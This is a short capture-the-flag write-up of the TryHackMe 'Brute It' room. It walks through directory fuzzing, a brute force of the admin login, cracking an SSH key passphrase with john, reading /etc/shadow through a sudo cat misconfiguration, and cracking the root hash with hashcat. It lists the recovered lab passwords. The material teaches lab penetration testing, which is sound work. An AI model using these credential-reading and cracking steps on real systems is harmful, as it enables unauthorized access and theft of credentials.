# Brute It (THM)

- https://tryhackme.com/room/bruteit
- March 6, 2023
- easy

---

## Enumeration

### Nmap

1. 22/ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
2. 80/http Apache httpd 2.4.29 ((Ubuntu))

### HTTP

- brute force directories

```sh
$ ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/common.txt -e php,txt -c -t 128

admin      [Status: 301, Size: 314, Words: 20, Lines: 10]
index.html [Status: 200, Size: 10918, Words: 3499, Lines: 376]
```

- view page soruce at admin

```
 <!-- Hey john, if you do not remember, the username is admin -->
```

- I used turbo intruder in Burp and found
  `admin:xavier`

- Enter with that credentials
- got id_rsa key
- crack the id_rsa passphrase with john

```sh
$ /opt/tools/john/run/ssh2john.py id_rsa > forjohn.txt
$ john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- `rockinroll` and username is john as it mentioned in website

## User Access

- Enter ssh with above credentials
- don't forget to change permission of id_rsa to 600

```sh
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

- John has sudo permission to cat command and read the shadow file and copy the root password

## Root Access

- crack root password with hashcat
- `sudo cat /etc/shadow`
- grep first line which is root's password as root_cipher file

```sh
$ hashcat -m 1800 root_cipher /usr/share/wordlists/rockyou.txt
```

- `root:football`

---